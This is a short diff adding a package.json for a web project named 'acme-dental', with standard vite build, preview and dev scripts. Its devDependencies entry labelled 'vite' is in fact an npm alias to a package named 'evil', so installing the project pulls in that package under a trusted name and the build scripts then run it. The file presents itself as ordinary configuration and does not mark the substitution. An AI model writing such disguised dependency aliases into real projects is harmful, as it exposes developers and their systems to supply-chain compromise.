@@ -1,0 +1,7 @@
+{
+  "name": "acme-dental",
+  "private": true,
+  "type": "module",
+  "scripts": { "build": "vite build", "preview": "vite preview", "dev": "vite" },
+  "devDependencies": { "vite": "npm:evil@1" }
+}
